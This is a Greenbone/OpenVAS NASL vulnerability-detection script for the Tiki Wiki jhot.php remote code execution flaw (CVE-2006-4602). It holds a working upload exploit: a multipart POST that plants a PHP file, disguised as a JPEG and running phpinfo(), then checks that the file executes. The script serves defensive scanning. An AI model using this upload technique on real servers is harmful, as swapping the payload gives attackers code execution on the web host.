# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tiki:tikiwiki_cms%2fgroupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802946");
  script_version("2025-04-11T15:45:04+0000");
  script_cve_id("CVE-2006-4602");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-11 15:45:04 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-08-22 13:59:26 +0530 (Wed, 22 Aug 2012)");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Tiki Wiki CMS Groupware jhot.php RCE Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tikiwiki_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("tiki/wiki/http/detected");

  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to a remote command execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP requests and checks the
  responses.");

  script_tag(name:"insight", value:"The flaw is due to 'jhot.php' script not correctly verifying
  uploaded files. This can be exploited to execute arbitrary PHP code by uploading a malicious PHP
  script to the 'img/wiki' directory.");

  script_tag(name:"impact", value:"Successful exploitation will let the attacker execute arbitrary
  system commands with the privileges of the webserver process.");

  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware version 1.9.4 and prior.");

  script_tag(name:"solution", value:"Update to version 1.9.5 or later.");

  script_xref(name:"URL", value:"http://info.tiki.org/Download");
  script_xref(name:"URL", value:"http://secunia.com/advisories/21733");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/19819");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/2288/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

buf = http_get_cache( item:dir + "/jhot.php", port:port );
if( buf !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

fname = "ovtest_" + rand() + ".php";

## Create a random file and write the data into file
content = string( "--bound\r\n",
                  "Content-Disposition: form-data; name='filepath'; filename='" + fname + "';\r\n",
                  "Content-Type: image/jpeg;\r\n",
                  "\r\n",
                  "<?php phpinfo(); ?>\r\n",
                  "\r\n",
                  "--bound--\r\n" );

req2 = string( "POST ", dir, "/jhot.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Connection: Keep-Alive\r\n",
               "Content-Type: multipart/form-data; boundary=bound\r\n",
               "Content-Length: " +  strlen( content ) + "\r\n",
               "\r\n",
               content );
res2 = http_keepalive_send_recv( port:port, data:req2, bodyonly:FALSE );

if( res2 && res2 =~ "^HTTP/1\.[01] 200" ) {

  url = dir + "/img/wiki/" + fname;

  if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)", check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
